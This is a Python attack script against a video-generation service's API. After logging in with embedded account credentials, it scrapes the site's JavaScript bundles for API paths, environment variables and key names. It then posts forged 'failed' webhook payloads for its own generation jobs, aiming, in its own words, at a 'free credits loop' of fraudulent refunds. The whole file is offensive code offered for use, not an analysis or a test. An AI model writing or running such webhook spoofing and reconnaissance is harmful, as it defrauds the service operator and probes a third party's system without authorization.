"""
1. Get soraTaskId from our generation status endpoint
2. Probe /api/video-generation/webhook with correct payload structure
3. If we can fake "failed" -> get refund -> free credits loop
4. Also: deep fetch JS bundle properly with browser headers
"""
import asyncio, aiohttp, re, json

EMAIL    = "quicken-jolt-crave@duck.com"
PASSWORD = "quicken-jolt-crave@duck.com"
BASE     = "https://www.viewmax.io"
HDRS     = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Accept":     "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate",
}
JSON_HDRS = {**HDRS, "Accept": "application/json", "Content-Type": "application/json"}


async def login(s):
    await s.post(f"{BASE}/api/auth/sign-in/email",
                 json={"email": EMAIL, "password": PASSWORD, "rememberMe": True},
                 headers=JSON_HDRS)


async def get_credits(s):
    async with s.get(f"{BASE}/api/me", headers=JSON_HDRS) as r:
        d = await r.json()
        svc = next((x for x in d.get("subscription", {}).get("services", []) if x["type"] == "AI_CREDITS"), {})
        return svc.get("used", 0), svc.get("max", 0), d.get("purchasedCredits", 0)


async def main():
    jar = aiohttp.CookieJar(unsafe=True)
    async with aiohttp.ClientSession(cookie_jar=jar) as s:
        await login(s)
        used0, max0, purchased0 = await get_credits(s)
        print(f"Credits: used={used0}/{max0}  purchased={purchased0}")

        # ── PHASE 1: Get the actual page HTML and find JS bundle ──
        print("\n── PHASE 1: Fetch page HTML for script tags ──")
        async with s.get(BASE + "/", headers=HDRS) as r:
            html = await r.text()
        
        print(f"  HTML length: {len(html)}")
        
        # Extract build ID
        build_id = None
        m = re.search(r'"buildId"\s*:\s*"([^"]+)"', html)
        if m:
            build_id = m.group(1)
            print(f"  Build ID: {build_id}")
        
        # Extract ALL script srcs
        scripts = re.findall(r'src="([^"]*\.js[^"]*)"', html)
        print(f"  Script tags: {len(scripts)}")
        for sc in scripts[:10]:
            print(f"    {sc}")
        
        # Extract __NEXT_DATA__
        m2 = re.search(r'<script id="__NEXT_DATA__"[^>]*>(.*?)</script>', html, re.DOTALL)
        if m2:
            try:
                nd = json.loads(m2.group(1))
                print(f"  __NEXT_DATA__ keys: {list(nd.keys())}")
                # Look for any props/config data
                props = nd.get("props", {})
                page_props = props.get("pageProps", {})
                print(f"  pageProps keys: {list(page_props.keys())[:10]}")
                if "runtimeConfig" in nd or "publicRuntimeConfig" in nd:
                    print(f"  !! runtimeConfig: {nd.get('runtimeConfig', nd.get('publicRuntimeConfig'))}")
            except Exception as e:
                print(f"  __NEXT_DATA__ parse error: {e}")
        
        # ── PHASE 2: Fetch JS bundle chunks ──
        print("\n── PHASE 2: Fetch and scan JS chunks ──")
        chunk_urls = [BASE + s for s in scripts if "/_next/" in s]
        
        # Also try to get build manifest if we have build_id
        if build_id:
            for path in [
                f"/_next/static/{build_id}/_buildManifest.js",
                f"/_next/static/{build_id}/_ssgManifest.js",
            ]:
                async with s.get(BASE + path, headers=HDRS) as r:
                    if r.status == 200:
                        text = await r.text()
                        print(f"  FOUND: {path} ({len(text)} bytes)")
                        # Extract more chunk paths
                        more = re.findall(r'"([a-f0-9]{16,})"', text)
                        for c in more[:20]:
                            chunk_urls.append(f"{BASE}/_next/static/chunks/{c}.js")
                        # Page paths
                        pages = re.findall(r'"(/[^"]{1,80})"', text)
                        print(f"  Pages in manifest: {[p for p in pages if not p.startswith('/_')][:20]}")
        
        all_api_paths = set()
        key_finds = []
        
        for url in chunk_urls[:40]:
            async with s.get(url, headers=HDRS) as r:
                if r.status == 200:
                    text = await r.text()
                    chunk_name = url.split("/")[-1][:30]
                    
                    # Find API paths
                    paths = re.findall(r'["`\'](/api/[a-zA-Z0-9/_\-\$\{\}]{2,60})["`\']', text)
                    for p in paths:
                        all_api_paths.add(p)
                    
                    # Find Kling-related stuff
                    for pattern, label in [
                        (r'klingai|kling\.ai|api\.klingai', "KLING_DOMAIN"),
                        (r'soraTaskId|sora_task_id|taskId|task_id', "TASK_ID_FIELD"),
                        (r'KLING[_A-Z0-9]*\s*[:=]\s*["\']([^"\']{10,})["\']', "KLING_KEY"),
                        (r'process\.env\.[A-Z_]{3,}', "ENV_VARS"),
                        (r'x-api-key|X-API-KEY|apiKey', "API_KEY_HEADER"),
                        (r'webhook|callback', "WEBHOOK_REF"),
                    ]:
                        matches = re.findall(pattern, text, re.IGNORECASE)
                        if matches:
                            unique = list(dict.fromkeys(matches))[:5]
                            key_finds.append((label, chunk_name, unique))
                            if label not in ("ENV_VARS",):  # too noisy
                                print(f"  [{label}] {chunk_name}: {unique[:3]}")
        
        # Print all discovered API paths
        print(f"\n  API paths in JS ({len(all_api_paths)}):")
        for p in sorted(all_api_paths):
            print(f"    {p}")
        
        # ── PHASE 3: Get our recent generations to find soraTaskId ──
        print("\n── PHASE 3: Get generation details to find soraTaskId ──")
        
        # Try to get generation data different ways
        endpoints_to_try = [
            "/api/video-generation",
            "/api/video-generation?page=1",
            "/api/video-generation?limit=10",
            "/api/video-generation/status",
            "/api/user/videos",
            "/api/account/videos",
            "/api/me/videos",
        ]
        
        for ep in endpoints_to_try:
            async with s.get(BASE + ep, headers=JSON_HDRS,
                              timeout=aiohttp.ClientTimeout(total=8)) as r:
                if r.status == 200:
                    d = await r.json()
                    print(f"  FOUND {ep}: {json.dumps(d)[:200]}")
        
        # Try our known generation IDs from race run
        known_ids = [
            "cmoeis7pv0007l10420qpjviu",
            "cmoeis7rm000fjv04uc2udyjy",
            "cmoeis7tg0023jr04ok46pr15",
        ]
        
        print("\n  Checking individual generation IDs for soraTaskId field...")
        id_str = ",".join(known_ids)
        async with s.get(f"{BASE}/api/video-generation/status?ids={id_str}", headers=JSON_HDRS) as r:
            if r.status == 200:
                d = await r.json()
                print(f"  Status response: {json.dumps(d)[:500]}")
                items = d if isinstance(d, list) else d.get("items", d.get("data", [d]))
                for item in items:
                    sora_id = item.get("soraTaskId") or item.get("taskId") or item.get("task_id") or item.get("externalId")
                    print(f"  gen_id={item.get('id','-')[:20]}  status={item.get('status')}  soraTaskId={sora_id}  all_keys={list(item.keys())[:12]}")
            else:
                t = await r.text()
                print(f"  {r.status}: {t[:200]}")
        
        # ── PHASE 4: Probe webhook with correct payload formats ──
        print("\n── PHASE 4: Probe webhook endpoint ──")
        
        webhook_payloads = [
            # Kling AI format
            {"task_id": "test-task-123", "task_status": "succeed", "task_result": {"videos": [{"url": "https://example.com/v.mp4", "duration": 5}]}},
            {"task_id": "test-task-123", "status": "succeed"},
            {"soraTaskId": "test-task-123", "status": "completed"},
            {"soraTaskId": "test-task-123", "status": "failed"},
            # Different field combos
            {"id": "test-task-123", "status": "failed"},
            {"taskId": "test-task-123", "status": "failed"},
            {"external_id": "test-task-123", "status": "failed"},
            {"task_id": "test-task-123", "status": "failed"},
            {"task_id": "test-task-123", "task_status": "failed"},
        ]
        
        for payload in webhook_payloads:
            async with s.post(f"{BASE}/api/video-generation/webhook",
                               json=payload, headers=JSON_HDRS,
                               timeout=aiohttp.ClientTimeout(total=10)) as r:
                body = (await r.text())[:200].replace('\n', ' ')
                if r.status != 404:
                    print(f"  [{r.status}] payload_keys={list(payload.keys())} -> {body}")
        
        # ── PHASE 5: Submit a real generation and immediately webhook it ──
        print("\n── PHASE 5: Submit generation + probe webhook with real ID ──")
        used_before = (await get_credits(s))[0]
        
        async with s.post(f"{BASE}/api/video-generation/generate",
                           json={"prompt": "a red apple on a wooden table",
                                 "orientation": "portrait", "duration": 5,
                                 "multiplier": 1, "model": "Kling v2.6"},
                           headers=JSON_HDRS) as r:
            gen_data = await r.json()
        
        print(f"  Generation: {gen_data}")
        gen_ids = gen_data.get("generationIds", [])
        
        if gen_ids:
            gen_id = gen_ids[0]
            await asyncio.sleep(1)
            
            # Get full details of this generation
            async with s.get(f"{BASE}/api/video-generation/status?ids={gen_id}", headers=JSON_HDRS) as r:
                status_data = await r.json()
                print(f"  Status data: {json.dumps(status_data)[:600]}")
                items = status_data if isinstance(status_data, list) else status_data.get("items", [status_data])
                for item in (items if isinstance(items, list) else [items]):
                    sora_id = item.get("soraTaskId") or item.get("taskId") or item.get("externalId")
                    print(f"  >>> soraTaskId={sora_id}  all_keys={list(item.keys())}")
                    
                    if sora_id:
                        print(f"\n  !!! Got soraTaskId: {sora_id}")
                        print(f"  Sending FAILED webhook to trigger refund...")
                        
                        failed_payloads = [
                            {"task_id": sora_id, "task_status": "failed"},
                            {"task_id": sora_id, "status": "failed"},
                            {"soraTaskId": sora_id, "status": "failed"},
                            {"soraTaskId": sora_id, "task_status": "failed"},
                        ]
                        
                        for fp in failed_payloads:
                            async with s.post(f"{BASE}/api/video-generation/webhook",
                                               json=fp, headers=JSON_HDRS) as wr:
                                wb = (await wr.text())[:200].replace('\n', ' ')
                                print(f"    [{wr.status}] {fp} -> {wb}")
                        
                        await asyncio.sleep(2)
                        used_after = (await get_credits(s))[0]
                        delta = used_after - used_before
                        print(f"\n  Credits delta: {delta} (0 = refunded, 4 = charged normally, -4 = net gain)")
        
        print("\n=== DONE ===")


asyncio.run(main())
